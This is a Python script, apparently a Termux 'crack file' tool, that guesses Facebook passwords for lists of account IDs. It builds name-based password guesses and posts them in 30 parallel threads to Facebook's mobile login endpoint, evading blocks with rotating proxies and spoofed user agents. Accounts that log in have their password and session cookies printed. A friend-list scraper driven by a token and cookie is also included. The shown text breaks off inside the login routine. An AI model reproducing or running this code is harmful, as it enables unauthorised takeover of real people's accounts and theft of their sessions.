   
#hhhhh aw hamu zahmata 😂 awja wara jwnesht bo bet hhh
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
import requests,zlib,platform
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
uas_random2 = random.choice(['Dalvik/1.6.0 (Linux; U; Android 4.4.4; Z987 Build/KTU84P) [FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build/R16NW) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;] FBBK/1Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build/JLS36C) [FBAN/FB4A;FBAV/175.0.0.40.97;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/111983758;FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-N9005 Build/NJH47F) [FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]'])
ua = ["[FBAN/FB4A;FBAV/272.0.0.5.123;FBBV/238037586;FBDM/{density=3.3,width=1080,height=1462};FBLC/pl_PL;FBRV/554524575;FBCR/MtelBG;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/329.0.0.4.136;FBBV/864563924;FBDM/{density=2.2,width=1080,height=1499};FBLC/ru_RU;FBRV/353651507;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/340.0.0.1.120;FBBV/268814452;FBDM/{density=2.5,width=1080,height=1429};FBLC/cs_CZ;FBRV/638656271;FBCR/Sprint;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/273.0.0.9.132;FBBV/777154050;FBDM/{density=2.5,width=1080,height=1443};FBLC/pl_PL;FBRV/858843890;FBCR/Sprint;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/395.0.0.3.174;FBBV/374874377;FBDM/{density=2.3,width=1080,height=1461};FBLC/nl_NL;FBRV/372646236;FBCR/MtelBG;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/355.0.0.8.133;FBBV/224982184;FBDM/{density=3.2,width=1080,height=1426};FBLC/en_US;FBRV/131150517;FBCR/Vi India;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2006C3LG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/337.0.0.6.190;FBBV/630779408;FBDM/{density=3.4,width=1080,height=1420};FBLC/ it_IT;FBRV/449658862;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI MAX 2;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/293.0.0.2.114;FBBV/118159055;FBDM/{density=2.4,width=1080,height=1478};FBLC/hi_IN;FBRV/142627588;FBCR/Jazz;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/346.0.0.7.187;FBBV/833621251;FBDM/{density=2.5,width=1080,height=1499};FBLC/en_PK;FBRV/297622271;FBCR/Oi;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/357.0.0.4.198;FBBV/289685626;FBDM/{density=3.3,width=1080,height=1437};FBLC/pl_PL;FBRV/909087265;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/ Mi 9;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"]
ua = [
    'Mozilla/5.0 (Linux; Android 11; Infinix X662 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 GoogleApp/13.48.11.26.arm64']
ua = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; KaiOS 3.0; Nokia 2780 Flip; Build/400.0.0.0; rv:74.0.0.0; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.0.0 Mobile Safari/537.36']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]']
ua = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 5.1.1; SM-G360V Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 13; RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.178 Mobile Safari/537.36 GoogleApp/15.7.50.28.arm64']
ua = [
    'Mozilla/5.0 (Linux; Android 13; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) SwiftkeyAndroid/9.10.29.19 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; RMX1805 Build/PKQ1.190319.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.3.3.0']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-M405F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36']

ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 [FBAN/FBIOS;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.5;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/Djezzy]",]
ua = ["Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/FB4A;FBAV/979.2.9.20.981;FBPN/com.facebook.katana;FBLC/en_US;FBBV/687217741;FBCR/Glo Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-N986N;FBSV/11;FBCA/x86:armeabi-v7a;FBDM/{density=2.5,width=1080,height=2220};FB_FW/0;FBRV/0;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; Nokia XR21 Build/TKQ1.220807.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; 21081111RG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64",]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mMAMA')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(1000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(1000, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
 
 
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(1000, 9999)
	c=random.randrange(1000, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
 
 
 
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/SADIM-143/Ua.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
 
def back():
	login()
POLICE="POLICE"
imt="SETU"
ak="CLASS3-"
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
  
pwpluss,pwnya=[],[]
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def POLICEe(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
#------------------[Logo]-----------------#
#IPYTHONI
def _IPYTHONI_(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008','10009','100010','100011','100012']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
def clear():
	os.system('clear')
         
def banner():
	os.system("clear")
	print (f"""
\033[0;95m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
     \x1b[38;5;48m
      :::::::::      :::     :::        :::  
     :+:    :+:   :+: :+:   :+:        :+:   
    +:+    +:+  +:+   +:+  +:+        +:+    
   +#+    +:+ +#++:++#++: +#+        +#+     
  +#+    +#+ +#+     +#+ +#+        +#+      
 #+#    #+# #+#     #+# #+#        #+#  (-‿◦)
#########  ###     ### ########## ########## 	
\033[0;95m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               """)
def login():
	banner()
	POLICEe('\033[1;96m[ 1 ] Crack File \n ')
	POLICEe('\033[0;97m===============================================')
	DALL= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if DALL in ['m']:
		public()
	elif DALL in ['1']:
		os.system("xdg-open       ") 
		crack_file()

		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('#DONE LOGOUT ')
		exit()
	else:
		print('# SELECT CORRECTLY ')
		back()
def error():
	print(f'{k}#TRY AGAIN {u}')
	time.sleep(4)
	back()
	
def result():
	os.system('clear')
	banner()
	print(' 1. CP ACCOUNT ')
	print(' 2. OK ACCOUNT')
	print(' 0. EXIT	')
	kz = input('\n Choose : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Not Found')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('You Have No CP Results ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n   Choose : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' CHOOSE RIGHT OPTION ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'  {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="yellow")
				nocp +=1
			input('[ Click Enter ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(' No OK FILE HERE ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+u)
			geeh = input('\n CHOOSE : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' SELECT RIGHT OPTION ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f' {cpkuni[0]}  {cpkuni[1]}'
				sol().print(cpkuh,style="green")
				nocp +=1
			input('[ CLICK ENTER 2 BACK ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('SELECT RIGHT OPTION ')
		exit()
 
def public():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		banner()
		jum = int(input('\x1b[1;97m [+] ENTER THE NUMBERS OF IDZ: '))
	except ValueError:
		
		back()
	if jum<1 or jum>100000000:
		
		back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' [] INPUT ID '+str(yz)+': ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('#TRY AGAIN ')
			os.system('clear')
	try:
		print(f' [] TOTAL ID: {P}'+str(len(id)))
		print('')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		print(f'IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWISE CHECK YOUR ID LINK ')
		time.sleep(3)
		back()
		
def crack_file():
	os.system('clear')
	banner()
	print('\033[1;32m [Put File Example:  /sdcard/Dall.txt  Etc..!]')
	o = input('\x1b[1;97m [+] Input File Name : ')
	print('')
	try:lin = open(o).read().splitlines()
	except:
		print('File Not Found')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()
	
def setting():
	print(f'[ 1 ] Crack With New idz')
	print(f'[ 2 ] Crack With Old idz')
	hu = input('Select : ')
	if hu in ['1','01']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['2','02']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\x1b[1;91m Select✖')
		exit()
	
	print(f'[ 1 ] Methode ➥ Mbasic.Facebook.com')
	hc = input('Select: ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input('[ 1 ] All First + Password + First ⦅God⦆ [ 2 ] Select Put Password ⦅Slow⦆')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'Pud 10 Password Your Add ?....: ')
		pwku=input('Paste Your Password? : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
def passwrd():
	os.system('clear')
	banner()
	print('\033[97;1m[\033[92;5m+\033[97;1m] \033[0;97mTOTAL IDz :\033[0;94m '+str(len(id)))
	POLICEe('\033[0;97m===============================================')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'1122')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'1212')
					pwv.append(frs+'1999')
					pwv.append(frs+'1998')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append('123456789'+frs)
					pwv.append('12345678'+frs)
					pwv.append('12345'+frs)
					pwv.append('1234'+frs)
					pwv.append('123'+frs)
					pwv.append(frs+'2000')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+frs)
										
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'1122')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'112233')
					pwv.append(frs+'123123')
					pwv.append(frs+'1212')
					pwv.append(frs+'1999')
					pwv.append(frs+'1998')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append('123456789'+frs)
					pwv.append('12345678'+frs)
					pwv.append('12345'+frs)
					pwv.append('1234'+frs)
					pwv.append('123'+frs)
					pwv.append(frs+'2000')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+frs)
				
				pool.submit(crack,idf,pwv)
	POLICEe('\033[0;97m===============================================')
	print(f'{h}[{h}🪂{h}]{h} OK ➼ : {h}%s '%(ok))
	input('CLICK ENTER TO EXIT🛬 ')		
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([K,h,Z,N,O,U])
	sys.stdout.write(f"\r{P}[{bo}𝑷𝑶𝑳𝑰𝑪𝑬{P}]∼{Z}[{bo}{loop}{Z}]{P}∼{P}[\x1b[38;5;48m𝑶𝑲ꪜ∙{ok}{P}] "),
	sys.stdout.flush()
	ua = random.choice(ugen) 
	ua2 = random.choice(ugen2) 
	ses = requests.Session()
	for pw in pwv:
		try:

			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-ua': '"Google Chrome";v="87", "Chromium";v="87", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"iOS"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade = {'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-ua': '"Google Chrome";v="87", "Chromium";v="87", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"iOS"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[38;5;48m|𝑶𝑲ꪜ| {idf} | {pw}')
				print(f'\r\x1b[38;5;48m{kuki}')
